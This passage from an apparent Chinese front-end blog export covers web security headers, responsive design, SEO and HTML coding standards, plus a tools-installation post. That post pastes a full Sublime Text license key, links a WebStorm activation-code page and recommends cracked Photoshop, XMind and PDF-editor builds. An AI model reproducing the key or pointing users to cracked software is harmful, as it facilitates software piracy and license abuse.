HTTPS通信过程的非对称和对称加解密计算会产生更多的服务器性能和时间上的消耗，但是这是可以优化的，这里就不细说了。 3.3浏览器安全3.3.1 同源策略首先了解一下同源策略： 源指的是有相同的HOST、相同的协议、相同的端口。 同源策略以源为单位，把资源天然分隔，保护了用户的信息安全。 绕过同源策略让javascript访问其他源的资源的方法，如：JSONP、CORS、flash等。 同源策略不是绝对安全的，面对很多攻击是无能为力的，比如XSS，因为此时攻击者就在同源之内。 不建议使用JSONP，因为JSONP通常在脚本中写一个回调函数，然后把回调函数的名字写在请求的URL中，因此如果请求数据的服务器被黑了，那么黑客就能在返回的数据中植入恶意代码，从而窃取用户的隐私信息。 跨域资源共享CORS允许资源提供方在响应头中加入一个特殊的标记，使你能通过XHR来获取、解析并验证数据。这样就能避免恶意代码在你的应用中执行。在响应头中加入的标记如下： 1Access-Control-Allow-Origin: allowed origins 如果对Access–Control-Allow-Origin设置为*其实是比较危险的，如果没有携带会话认证意味着信息被公开在全网，建议设置具体的域名，而且跨域的时候记得带上session id；严格审查请求信息，比如请求参数，还有http头信息，因为 http头可以伪造。 3.3.2 CSP(Content Security Policy)CSP指定网站上所有脚本和图片等资源的源站点，也能阻止所有内联（inline）的脚本和样式。即使有人在页面评论或者留言中嵌入了脚本标签，这些脚本代码也不会被执行。可通过两种方式设置，如果 HTTP 头与 Meta 定义同时存在，则优先采用 HTTP 头中的定义： 通过 HTTP 头，比如只允许脚本从本源加载：Content-Security-Policy: script-src ‘self’，其中script-src ‘self’是策略。 通过HTML的Meta标签，比如只允许脚本从本源加载： 1&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;&quot;&gt; 其他策略： script-src – 设置可以接受的JavaScript代码的源站点 style-src – 设置可以接受的CSS样式代码的源站点 connect-src – 定义浏览器可以通过XHR、WebSocket或者 EventSource访问哪些站点 font-src – 设置可以接受的字体文件的源站点 frame-src – 定义浏览器可以通过iframe访问哪些站点 img-src – 设置可以接受的图片的源站点 media-src – 设置可以接受的音频和视频文件的源站点 object-src – 设置可以接受的Flash和其它插件的源站点 缺点：默认情况下，所有的内联JavaScript脚本都不会被执行，因为浏览器无法区分自己的内联脚本和黑客注入的脚本。CSP还会默认阻止所有eval()风格的代码的执行，包括setInterval/setTimeout中的字符串和类似于new Function(‘return false’)之类的代码。 3.3.3 iframe 沙箱环境利用iframe进行跨源：HTML5为iframe提供了安全属性 sandbox，iframe的能力将会被限制。 3.3.4 Secure和HttpOnly属性Secure能确保cookie的内容只能通过SSL连接进行传输。Secure和HttpOnly属性告诉浏览器cookie的内容只能分别通过HTTP(S)协议进行访问，从而避免了被轻易窃取，比如禁止从JavaScript中的document.cookie访问，因此cookie在浏览器document中不可见了。如果单独使用的话，无法全面抵御跨站点脚本攻击，通常和其他技术组合使用。使用方法如下： 1Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;name&gt;=&lt;value&gt;] [; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;][; path=&lt;some_path&gt;][; secure][; HttpOnly] 3.3.5 其他安全相关的HTTP 头 X-Content-Type-Options 告诉浏览器相信此服务器下发的资源的类型，防止类型嗅探攻击。 HPKP(Public Key Pinning) Public Key Pinning 是一个response 头，用来检测一个证书的公钥是否发生了改变，防止中间人攻击。 HSTS (HTTP Strict-Transport-Security) 强制使用TSL作为数据通道。 3.4 HTML5 对web安全的影响html5有很多新的特性能力，然而能力越大，被攻破后的危险就越大。HTML5 对xss的影响主要体现在: 攻击面更大，html5带来更多的标签和更多的属性如&lt;video&gt;,&lt;audio&gt;,&lt;canvas&gt;等； 危害更大，HTML5更多的资源可以被xss利用。黑客可以利用浏览器的一切权限，比如本地存储、GEO、服务器推送机制WebSocket，js多线程执行Webworker等。 比如localstorage只能通过js设置和获取，导致的结果是不能像cookie一样设置httponly等属性，所以localstorage中不能存放敏感信息，最好能够在服务端进行加密，可以配合CORS来获取网站的localstorage的信息。 4 响应式响应式布局简而言之，就是一个网站能够兼容多个终端，可以为不同终端的用户提供更加舒适的界面和更好的用户体验。 基于栅格布局规划响应式设计，每个模块尽可能严格遵循栅格布局，符合栅格的小模块能很灵活的适应多个分辨率的展示。 拥抱flexbox。 使用动态的字体大小单位+rem单位使用。 使用CSS3 mediaQuery 技术响应用户设备。 利用百分比。 对低版本浏览器使用JS动态响应。 一套“自适应”素材兼容各种分辨率，提升页面性能，比如自适应的图片/视频素材。 比如凹凸实验室博客页面在PC端、iPad、手机端的排版：PC端： iPad： 手机端： 5 兼容性估计很多人对这句话都有体会：IE虐我千百遍，我待IE如初恋。当然，除了 IE 上有兼容性问题，其他浏览器比如 Android 上的低版本浏览器也有较多问题。是否继续保持对低端浏览器的兼容性，我们可以用数据跟产品经理或者老板说话，减少我们的工作量，最好在项目之前就定下来支持最低支持的版本是什么，然后设计一个对应兼容方案。以下是百度统计的2015年的浏览器市场份额数据： 兼容性的原则：渐进增强与平稳退化。就是说，在低级浏览器能够保证其可用性和可访问性；渐进增强，在保证代码、页面在低级浏览器中的可用性及可访问性的基础上，逐步增加功能及用户体验。如果出现兼容性问题了，怎么处理： 确认触发场景，什么浏览器、版本、什么情况下会出现这个问题，做到稳定复现。 找到问题原因，为什么会出现这样的问题（自己琢磨、网上搜、问同事）。 确定解决办法：参考现成的规范，比如某些属性不能使用以及一些hack的处理。 积累兼容性处理方法。 淘宝首页在兼容性上做了一个小创新：Html钩子在html上加上操作系统、浏览器内核、浏览器类型、CSS3动画支持、IE各版本类，好处在于： 渐进增强 可以实现不同浏览器下差异化体验。 能快速定位并修复某个浏览器下的特定bug。 淘宝首页html钩子： 兼容性问题是老生常谈的问题了，团队之间共同努力形成一个bug兼容性积累文档，是最好不过的了。 6 搜索SEO6.1 语义化 标签语义化对搜索引擎友好，良好的结构和语义容易被搜索引擎抓取。 善用标题h1，h2，h3，h4，h5，h6，特别是h1和h2；H(x)标签中使用关键字，可提升排名。同时设置 rel=“nofollow”避免权重流失。 使用 HTML5 中的 Microdata 对 Web 页面上已经存在的数据提供附加的语义。Microdata 由名字 / 值（name/value）对组成，每一个词汇表定义一组命名的属性。对 Microdata 的支持可以影响搜索结果的显示，使得显示结果更加丰富，虽然不能影响搜索结果的排名，但是网站的流量可能会有所增加。类似的技术还有资源描述框架RDF、微格式Microformat 。 6.2 衡量站点关键词优化 站点内容以及关键词的选择。 描述标签、关键词标签、代替属性。 长尾关键词：非目标关键词但也可以带来搜索流量的关键词；例如，目标关键词是服装，其长尾关键词可以是男士服装、冬装、户外运动装等。长尾关键词基本属性是：可延伸性，针对性强，范围广。 关键词的分布情况。 关键词密度、看重：合理的关键字密度可获得较高的排名位置，密度过大会起到相反的效果。一般说来，在大多数的搜索引擎中，关键词密度在2%~8%是一个较为适当的范围，有利于网站在搜索引擎中排名。 是否存在作弊行为。 6.3 链接 优化文件目录结构和URL。URL应该有语义性，简短易懂。 通过推广暴露自己的链接，增加信任度。链接分为外向链接和内向（反向）链接，外向链接就是从本站点到其他站点，内向链接就是从其他站点到我的站点，可以尝试使用反向链接生成器。或者通过写软文、发布分类信息、发布博客文章来推广自己的网站。 锚文本 ：把关键词做一个链接，指向别的网页，这种形式的链接就叫作锚文本。搜索引擎可以根据指向某一个网页的链接的锚文本描述来判断该网页的内容属性。 6.4 良好的网站导航和sitemap网站需要有一个良好的导航，控制根目录和各子目录的关键，通过sitemap可以帮助网站主了解网站结构，也方便搜索引擎收录整个站点。 7 其他优化7.1 信息无障碍信息无障碍一般可以从以下几点入手： 添加landmark角色，在页面主要操作区域（搜索框、登录框、列表内容）添加“role”标签加以说明。landmark值一般有：banner（banner）、complementary（辅助内容区）、contentinfo（网站信息和版权）、form（表单）、main（主内容区）、navigation（导航区）、search（搜索区），如： 提供文字替代方案。比如给图片或其他元素提供适当的alt属性或者title属性的值。 表单使用label标签。 使用heading做信息架构。读屏软件提供了快捷键切换heading，相关用户可通过读屏软件了解我们的网站信息架构。 给页面里重要区块和功能添加accesskey，可以快速定位。 触发界面转换需设置焦点。比如，对于浮层需要注意避免“Tab”焦点中断。 考虑到老年眼睛老花，因此需要保证字体够大，或者网站可缩放。 具体可参考无障碍阅读 7.2 微动画通过前端动画技术给页面进行优化，比如： 商品图片hover效果 小图标旋转效果 购物车微动画 loading动画，当加载页面需要一定时间，特别是移动端，可以通过有趣的loading动画吸引用户，这里有一些有趣的loading动画 7.3 requireJsrequireJs框架特性： 前端设计及开发人员统一代码规范。 按需加载。 AMD规范：以简单而优雅的方式统一了JavaScript的模块定义和加载机制，降低了学习和使用各种框架的门槛，能够以一种统一的方式去定义和使用模块，提高开发效率，降低了应用维护成本。 与Grunt结合可实现一站式工作流。 7.4 多标签状态同步场景如下：页面一：去一个网站买东西，未登录状态下，进入首页；页面二：然后新窗口打开任意页面，登录并成功返回。再次访问页面一，发现页面还是未登录状态，实际上用户已经登录了，这种体验是很差的。我们是不是有什么办法可以实现多标签状态同步呢？有的，利用Page Visibility： 页面可见性API就是表示网页可见还是不可见的。页面可见性API有两个属性，一个事件，如下： document.hidden: Boolean值，表示当前页面可见还是不可见 document.visibilityState: 返回当前页面的可见状态，状态值有hidden、visible、prerender、preview。 visibilitychange: 当可见状态改变时候触发的事件。 浏览器支持：IE10+、Chrome、FireFox。 多标签状态同步demo: 网页可见性API与登录同步 7.5 个性化推荐 HTML5 Geolocation API获得用户的地理位置，进行基于地理位置的运营。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"前端优化","slug":"前端优化","permalink":"//www.shen.ee/tags/前端优化/"},{"name":"性能","slug":"性能","permalink":"//www.shen.ee/tags/性能/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"常用开发工具安装","slug":"开发工具安装","date":"2017-05-22T01:01:34.000Z","updated":"2021-11-15T07:55:36.546Z","comments":true,"path":"article/7482.html","link":"","permalink":"//www.shen.ee/article/7482.html","excerpt":"","text":"前端常用软件及工具环境Node.js一个基于 Chrome V8 引擎的 JavaScript 运行环境，对于现如今的前端开发者而言几乎是必备的。 下载地址 Python不多解释，个人爱好。 下载地址 AMPApache+Mysql+PHP 编辑器sublime text3Sublime Text 是一款流行的代码编辑器软件，也是HTML和散文先进的文本编辑器，可运行在Linux，Windows和Mac OS X。也是许多程序员喜欢使用的一款文本编辑器软件。 Sublime在我认为是最轻便的编辑器了，当然你可以装许多对你有帮助的插件。如下图，我装了一些主题和开发插件。 下载地址 安装后打开sublime text3，找到上面菜单 help &gt; enter License,复制下面的注册码到内容框里。 123456789101112131415161718192021Michael BarnesSingle User LicenseEA7E-8213858A353C41 872A0D5C DF9B2950 AFF6F667C458EA6D 8EA3C286 98D1D650 131A97ABAA919AEC EF20E143 B361B1E7 4C8B7F04B085E65E 2F5F5360 8489D422 FB8FC1AA93F6323C FD7F7544 3F39C318 D95E6480FCCC7561 8A4A1741 68FA4223 ADCEDE07200C25BE DBBC4855 C4CFB774 C5EC138C0FEC1CEF D9DCECEC D3A5DAD1 01316C36 重启一下sublime text3，再看看菜单help下已经没有了enter License，就说明顺利激活了。 下面是我收藏常用的一些插件主题 A File icon 侧边栏文件图标样式美化 All Autocomplete Sublime Text 默认的 Autocomplete 功能只考虑当前的文件，而 AllAutocomplete 插件会搜索所有打开的文件来寻找匹配的提示词 Auto FileName 自动完成文件名的输入，如图片选取 color sublime 一个Sublime主题的网站（可以预览更换主题） CSS3 CSS3的样式美化、高亮显示以及自动完成 cssrem px转rem DocBlockr 定制注释 EditorConfig 代码编写规范配置 Emmet 前端开发神器,Emmet 使用缩写语法快速编写 HTML、CSS 以及实现其他的功能，极大的提高前端开发效率。 Jquery jquery提示补全 Git git版本控制 Less2Css 不用我多说，看字面意思也懂，less自动转换css的一个插件 MarkDown Editing 支持Markdown语法高亮；支持Github Favored Markdown语法；自带3个主题。 MarkdownPreview 按CTRL + B生成网页HTML；在最前面添加[TOC]自动生成目录； material theme 特别好的一个主题 SublimeText Transparent 半透明，配合浏览器，写了一目了然 sidebar 侧边栏增强 Table Editor 用于在文档中快速创建整齐好看的表格。 HTML-CSS-JS Prettify 格式化插件 imagePaste 复制的图片直接粘贴，按下ctrl+v的时候，自动把图片保存的你写的同级目录，并创建跟你文件同名的文件夹用来存放图片,写md文档最好不过。 LiveReload 实时刷新,需要配合Chrome 使用,在扩展程序中安装上LiveReload ,设置中勾上“允许访问文件网址” SublimeCodeIntel 实现代码智能提示和自动完成功能 terminal 快捷打开命令行工具 WebStormWebStorm 是jetbrains公司旗下一款JavaScript 开发工具。被广大中国JS开发者誉为”Web前端开发神器”、”最强大的HTML5编辑器”、”最智能的JavaScript IDE”等 官网地址：http://www.jetbrains.com/webstorm/ 去官网下载最新版本进行安装在安装过程中会要求你激活，如果不激活只有免费30天试用 激活码可参考: http://blog.csdn.net/xx1710/article/details/51725012 必备软件Photoshop CS6破解直装版Photoshop主要处理以像素所构成的数字图像。使用其众多的编修与绘图工具，可以有效地进行图片编辑工作。也是咱们前端人员必备的图片工具。 下载地址 Everything最快最好用的文件搜索工具 下载地址 EditHosts快捷编辑host文件，再也不用每次麻烦的去找了。 下载地址 picpick一个全功能的屏幕截图工具,直观的图像编辑器,颜色选择器,颜色调色板,像素标尺,量角器,瞄准线和白板等等。 下载地址 Pxcook像素大厨，高效易用的自动标注工具，前端开发神器。 下载地址 XMind破解版直装版XMind是一款实用的思维导图软件，简单易用、美观、功能强大，拥有高效的可视化思维模式，具备可扩展、跨平台、稳定性和性能，真正帮助用户提高生产率，促进有效沟通及协作。 下载地址 TeamViewerTeamViewer远程桌面解决方案：连接远程计算机，提供远程支持和在线协作。 安装的时候选择个人就行了，其他都需要购买激活。 下载地址 Typora对于很多博主来说MarkDown语法简直不能在熟悉了，用它写东西可以几乎不用考虑排版就可以得到还过得去的文章格式，一款极致简洁的markdown编辑器。 下载地址 PDF编辑器绿色便携版PDF编辑器还是平常用的比较多的软件，这个版本是破解永久授权，无试用期限。 下载地址 版本控制git(分布式版本控制系统)Git是一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。是团队开发中的不二之选。 下载地址 tortoisegittortoisegit也就是我们平常说的小乌龟，是一个git可视化操作的工具，不用繁琐的去命令行执行各种命令了。ps：个人还是喜欢用命令，毕竟命令最快。 下载地址 记得下载完安装包，再去下载安装下语言包。","categories":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}],"tags":[],"keywords":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}]},{"title":"前端开发规范","slug":"前端开发规范","date":"2017-05-21T09:01:34.000Z","updated":"2021-11-15T07:55:36.545Z","comments":true,"path":"article/39645.html","link":"","permalink":"//www.shen.ee/article/39645.html","excerpt":"","text":"前端开发规范一般规范统一编码为了使我们所编写的项目在任何语言的操作系统上都能运行，达到国际化，编码统一使用 UTF-8 文件/资源命名在 web 项目中，所有的文件名应该都遵循同一命名约定。以可读性而言，减号（-）是用来分隔文件名的不二之选。同时它也是常见的 URL 分隔符，所以理所当然的，减号应该也是用来分隔资源名称的好选择。 请确保文件命名总是以字母开头而不是数字。而以特殊字符开头命名的文件，一般都有特殊的含义与用处（比如 compass[1] 中的下划线就是用来标记跳过直接编译的文件用的）。 资源的字母名称必须全为小写，这是因为在某些对大小写字母敏感的操作系统中，当文件通过工具压缩混淆后，或者人为修改过后，大小写不同而导致引用文件不同的错误，很难被发现。 还有一些情况下，需要对文件增加前后缀或特定的扩展名（比如 .min.js, .min.css），抑或一串前缀（比如 3fa89b.main.min.css）。这种情况下，建议使用点分隔符来区分这些在文件名中带有清晰意义的元数据。 不推荐 12345MyScript.jsmyCamelCaseName.cssi_love_underscores.html1001-scripts.jsmy-file-min.css 推荐 12345my-script.jsmy-camel-case-name.cssi-love-underscores.htmlthousand-and-one-scripts.jsmy-file.min.css 协议不要指定引入资源所带的具体协议。 当引入图片或其他媒体文件，还有样式和脚本时，URLs 所指向的具体路径，不要指定协议部分（http:, https:），除非这两者协议都不可用。 不指定协议使得 URL 从绝对的获取路径转变为相对的，在请求资源协议无法确定时非常好用，而且还能为文件大小节省几个字节。 不推荐 1&lt;script src=\"http://cdn.com/foundation.min.js\"&gt;&lt;/script&gt; 推荐 1&lt;script src=\"//cdn.com/foundation.min.js\"&gt;&lt;/script&gt; 不推荐 123.example &#123; background: url(http://static.example.com/images/bg.jpg);&#125; 推荐 123.example &#123; background: url(//static.example.com/images/bg.jpg);&#125; 文本缩进一次缩进两个空格。 html 代码: 1234567&lt;ul&gt; &lt;li&gt;Fantastic&lt;/li&gt; &lt;li&gt;Great&lt;/li&gt; &lt;li&gt; &lt;a href=\"#\"&gt;Test&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt; css 代码: 12345@media screen and (min-width: 1100px) &#123; body &#123; font-size: 100%; &#125;&#125; js 代码: 12345678910(function()&#123; var x = 10; function y(a, b) &#123; return &#123; result: (a + b) * x &#125; &#125;&#125;()); 这个其实也就是一直在讨论的代码风格,例如分号到底是加还是不加，使用单引号还是双引号等等。 为了约定大家的代码风格，所以在社区中诞生了一些比较规范的代码风格规范： JavaScript Standard Style Airbnb JavaScript Style 注释注释是你自己与你的小伙伴们了解代码写法和目的的唯一途径。特别是在写一些看似琐碎的无关紧要的代码时，由于记忆点不深刻，注释就变得尤为重要了。 编写自解释代码只是一个传说，没有任何代码是可以完全自解释的。而代码注释，则是永远也不嫌多。当然，尽量让自己写的代码一目了然，减少注释也就减少项目体积。 当你写注释时一定要注意：尽量不要写你的代码都干了些什么，而要写你的代码为什么要这么写，背后的考量是什么。当然也可以加入所思考问题或是解决方案的链接地址。 大区块必须注释，小区块适量注释。 例如： 123456789101112131415161718//时间戳转换日期时间inspiry.getDate = function (dt) &#123; dt = new Date(dt); var year = dt.getFullYear(); var month = dt.getMonth() + 1; var day = dt.getDate(); var hour = dt.getHours(); var min = dt.getMinutes(); var s = dt.getSeconds(); //修改双位数 month = month &lt; 10 ? \"0\" + month : month; day = day &lt; 10 ? \"0\" + day : day; hour = hour &lt; 10 ? \"0\" + hour : hour; min = min &lt; 10 ? \"0\" + min : min; s = s &lt; 10 ? \"0\" + s : s; //返回转换后的日期（返回格式可根据项目需求更改） return year + \"-\" + month + \"-\" + day + \" \" + hour + \":\" + min + \":\" + s;&#125; 代码检查对于比较宽松自由的编程语言来说，严格遵循编码规范和格式化风格指南就显得极为重要。遵循规范固然很好，但是有自动化流程来确保其执行情况，岂不更佳。Trust is good, control is better. 对于 JavaScript，建议使用 JSLint 或 JSHint。当然可能对国人不太友好，我个人经常在用的是Fundebug，目前完全免费。 HTML规范文档类型推荐使用 HTML5 的文档类型申明： &lt;!DOCTYPE html&gt;. （建议使用 text/html 格式的 HTML。避免使用 XHTML。XHTML 以及它的属性，比如 application/xhtml+xml 在浏览器中的应用支持与优化空间都十分有限）。 HTML 中最好不要将无内容元素[1] 的标签闭合，例如：使用 &lt;br&gt; 而非 &lt;br /&gt;. HTML验证一般情况下，建议使用能通过标准规范验证的 HTML 代码，除非在性能优化和控制文件大小上不得不做出让步。 使用诸如 W3C HTML validator 这样的工具来进行检测。 规范化的 HTML 是显现技术要求与局限的显著质量基线，它促进了 HTML 被更好地运用。 省略可选标签HTML5 规范中规定了 HTML 标签是可以省略的。但从可读性来说，在开发的源文件中最好不要这样做，因为省略标签可能会导致一些问题。 省略一些可选的标签确实使得页面大小减少，这很有用，尤其是对于一些大型网站来说。为了达到这一目的，我们可以在开发后期对页面进行压缩处理，在这个环节中这些可选的标签完全就可以省略掉了。 不推荐 12&lt;title&gt;Test&lt;/title&gt;&lt;article&gt;This is only a test. 推荐 1234&lt;!DOCTYPE html&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;Test&lt;/title&gt;&lt;article&gt;This is only a test.&lt;/article&gt; 脚本加载出于性能考虑，脚本异步加载很关键。一段脚本放置在 &lt;head&gt; 内，比如 &lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;，其加载会一直阻塞 DOM 解析，直至它完全地加载和执行完毕。这会造成页面显示的延迟。特别是一些重量级的脚本，对用户体验来说那真是一个巨大的影响。 异步加载脚本可缓解这种性能影响。如果只需兼容 IE10+，可将 HTML5 的 async 属性加至脚本中，它可防止阻塞 DOM 的解析，甚至你可以将脚本引用写在 &lt;head&gt; 里也没有影响。 如需兼容老旧的浏览器，实践表明可使用用来动态注入脚本的脚本加载器。你可以考虑 yepnope 或 labjs。注入脚本的一个问题是：一直要等到 CSS 对象文档已就绪，它们才开始加载（短暂地在 CSS 加载完毕之后），这就对需要及时触发的 JS 造成了一定的延迟，这多多少少也影响了用户体验吧。 终上所述，兼容老旧浏览器(IE9-)时，应该遵循以下最佳实践。 脚本引用写在 body 结束标签之前，并带上 async 属性。这虽然在老旧浏览器中不会异步加载脚本，但它只阻塞了 body 结束标签之前的 DOM 解析，这就大大降低了其阻塞影响。而在现代浏览器中，脚本将在 DOM 解析器发现 body 尾部的 script 标签才进行加载，此时加载属于异步加载，不会阻塞 CSSOM（但其执行仍发生在 CSSOM 之后）。 所有浏览器中(考虑兼容)，推荐 12345678910&lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" href=\"main.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- body goes here --&gt; &lt;script src=\"main.js\" async&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 只在现代浏览器中(不考虑兼容)，推荐 123456789&lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" href=\"main.css\"&gt; &lt;script src=\"main.js\" async&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- body goes here --&gt; &lt;/body&gt;&lt;/html&gt; 语义化根据元素（有时被错误地称作“标签”）其被创造出来时的初始意义来使用它。打个比方，用 heading 元素来定义头部标题，p 元素来定义文字段落，用 a 元素来定义链接锚点，等等。 有根据有目的地使用 HTML 元素，对于可访问性、代码重用、代码效率来说意义重大。 以下示例列出了一些的语义化 HTML 主要情况： 不推荐 1234567891011121314151617181920212223242526272829&lt;b&gt;My page title&lt;/b&gt;&lt;div class=\"top-navigation\"&gt; &lt;div class=\"nav-item\"&gt;&lt;a href=\"#home\"&gt;Home&lt;/a&gt;&lt;/div&gt; &lt;div class=\"nav-item\"&gt;&lt;a href=\"#news\"&gt;News&lt;/a&gt;&lt;/div&gt; &lt;div class=\"nav-item\"&gt;&lt;a href=\"#about\"&gt;About&lt;/a&gt;&lt;/div&gt;&lt;/div&gt; &lt;div class=\"news-page\"&gt; &lt;div class=\"page-section news\"&gt; &lt;div class=\"title\"&gt;All news articles&lt;/div&gt; &lt;div class=\"news-article\"&gt; &lt;h2&gt;Bad article&lt;/h2&gt; &lt;div class=\"intro\"&gt;Introduction sub-title&lt;/div&gt; &lt;div class=\"content\"&gt;This is a very bad example for HTML semantics&lt;/div&gt; &lt;div class=\"article-side-notes\"&gt;I think I'm more on the side and should not receive the main credits&lt;/div&gt; &lt;div class=\"article-foot-notes\"&gt; This article was created by David &lt;div class=\"time\"&gt;2014-01-01 00:00&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"section-footer\"&gt; Related sections: Events, Public holidays &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; &lt;div class=\"page-footer\"&gt; Copyright 2014&lt;/div&gt; 推荐 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!-- 页面头部 --&gt;&lt;header&gt; &lt;!-- 页面标题 一个页面要求只能有一个h1标签 --&gt; &lt;h1&gt;My page title&lt;/h1&gt;&lt;/header&gt; &lt;!-- 导航 --&gt;&lt;nav class=\"top-navigation\"&gt; &lt;ul&gt; &lt;li class=\"nav-item\"&gt;&lt;a href=\"#home\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li class=\"nav-item\"&gt;&lt;a href=\"#news\"&gt;News&lt;/a&gt;&lt;/li&gt; &lt;li class=\"nav-item\"&gt;&lt;a href=\"#about\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; &lt;!-- 页面主体内容 --&gt;&lt;main class=\"news-page\" role=\"main\"&gt; &lt;!-- 页面的一部分应该进入一个section元素。将页面划分为具有语义元素的部分. --&gt; &lt;section class=\"page-section news\"&gt; &lt;!-- 一个节头应该进入一个节元素 --&gt; &lt;header&gt; &lt;h2 class=\"title\"&gt;All news articles&lt;/h2&gt; &lt;/header&gt; &lt;!-- 文章模块 --&gt; &lt;article class=\"news-article\"&gt; &lt;!-- 文章模块头部 --&gt; &lt;header&gt; &lt;div class=\"article-title\"&gt;Good article&lt;/div&gt; &lt;small class=\"intro\"&gt;Introduction sub-title&lt;/small&gt; &lt;/header&gt; &lt;!-- 文章模块内容 --&gt; &lt;div class=\"content\"&gt; &lt;p&gt;This is a good example for HTML semantics&lt;/p&gt; &lt;/div&gt; &lt;!-- 文章侧边栏 --&gt; &lt;aside class=\"article-side-notes\"&gt; &lt;p&gt;I think I'm more on the side and should not receive the main credits&lt;/p&gt; &lt;/aside&gt; &lt;!-- 文章页脚 --&gt; &lt;footer class=\"article-foot-notes\"&gt; &lt;p&gt;This article was created by David &lt;time datetime=\"2014-01-01 00:00\" class=\"time\"&gt;1 month ago&lt;/time&gt;&lt;/p&gt; &lt;/footer&gt; &lt;/article&gt; &lt;!-- 区域页脚 --&gt; &lt;footer class=\"section-footer\"&gt; &lt;p&gt;Related sections: Events, Public holidays&lt;/p&gt; &lt;/footer&gt; &lt;/section&gt;&lt;/main&gt; &lt;!-- 页面尾部 --&gt;&lt;footer class=\"page-footer\"&gt; Copyright 2014&lt;/footer&gt; 多媒体回溯对页面上的媒体而言，像图片、视频、canvas 动画等，要确保其有可替代的接入接口。图片文件我们可采用有意义的备选文本（alt），视频和音频文件我们可以为其加上说明文字或字幕。 提供可替代内容对可用性来说十分重要。试想，一位盲人用户如何能知晓一张图片是什么，要是没有 @alt 的话。 （图片的 alt 属性是可不填写内容的，纯装饰性的图片就可用这么做：alt=&quot;&quot;）。 不推荐 1&lt;img src=&quot;luke-skywalker.jpg&quot;&gt; 推荐 1&lt;img src=\"luke-skywalker.jpg\" alt=\"天行者骑着一匹陌生的马\"&gt; 尽量用 alt 标签去描述图片，设想你需要对于那些只能通过语音或者看不见图片的用户表达图片到底是什么。 不推荐 1&lt;img src=\"huge-spaceship-approaching-earth.jpg\" alt=\"头部图片\"&gt; 推荐 1&lt;img src=\"huge-spaceship-approaching-earth.jpg\" alt=\"一艘正在接近地球的巨大宇宙飞船\"&gt; 关注点分离理解 web 中如何和为何区分不同的关注点，这很重要。这里的关注点主要指的是：信息（HTML 结构）、外观（CSS）和行为（JavaScript）。为了使它们成为可维护的干净整洁的代码，我们要尽可能的将它们分离开来。 严格地保证结构、表现、行为三者分离，并尽量使三者之间没有太多的交互和联系。 就是说，尽量在文档和模板中只包含结构性的 HTML；而将所有表现代码，移入样式表中；将所有动作行为，移入脚本之中。 在此之外，为使得它们之间的联系尽可能的小，在文档和模板中也尽量少地引入样式和脚本文件。 清晰的分层意味着： 不使用超过一到两张样式表（i.e. main.css, vendor.css） 不使用超过一到两个脚本（学会用合并脚本） 不使用行内样式（&lt;style&gt;.no-good {}&lt;/style&gt;） 不在元素上使用 style 属性（&lt;hr style=&quot;border-top: 5px solid black&quot;&gt;） 不使用行内脚本（&lt;script&gt;alert(&#39;no good&#39;)&lt;/script&gt;） 不使用表象元素（i.e. &lt;b&gt;, &lt;u&gt;, &lt;center&gt;, &lt;font&gt;, &lt;b&gt;） 不使用表象 class 名（i.e. red, left, center） 不推荐 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;link rel=\"stylesheet\" href=\"base.css\"&gt; &lt;link rel=\"stylesheet\" href=\"grid.css\"&gt; &lt;link rel=\"stylesheet\" href=\"type.css\"&gt; &lt;link rel=\"stylesheet\" href=\"modules/teaser.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 style=\"font-size: 3rem\"&gt;&lt;/h1&gt; &lt;b&gt;I'm a subtitle and I'm bold!&lt;/b&gt; &lt;center&gt;Dare you center me!&lt;/center&gt; &lt;script&gt; alert('Just dont...'); &lt;/script&gt; &lt;div class=\"red\"&gt;I'm important!&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 推荐 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;!-- 将你的样式表统一成一个单一的样式 --&gt; &lt;link rel=\"stylesheet\" href=\"main.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 不要使用行内样式，而是在样式表中指定合理的类并应用样式 --&gt; &lt;h1 class=\"title\"&gt;&lt;/h1&gt; &lt;!-- 不要使用表意不明的类 --&gt; &lt;div class=\"sub-title\"&gt;I'm a subtitle and I'm bold!&lt;/div&gt; &lt;span class=\"comment\"&gt;Dare you center me!&lt;/span&gt; &lt;div class=\"important\"&gt;I'm important!&lt;/div&gt; &lt;!-- 将所有脚本放入文件中，并将其放入一个单独的文件中 --&gt; &lt;script async src=\"main.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Type 属性省略样式表与脚本上的 type 属性。鉴于 HTML5 中以上两者默认的 type 值就是 text/css 和 text/javascript，所以 type 属性一般是可以忽略掉的。甚至在老旧版本的浏览器中这么做也是安全可靠的。 不推荐 12&lt;link rel=\"stylesheet\" href=\"main.css\" type=\"text/css\"&gt;&lt;script src=\"main.js\" type=\"text/javascript\"&gt;&lt;/script&gt; 推荐 12&lt;link rel=\"stylesheet\" href=\"main.css\"&gt;&lt;script src=\"main.js\"&gt;&lt;/script&gt; 微格式在 SEO 和可用性上的运用如果 SEO 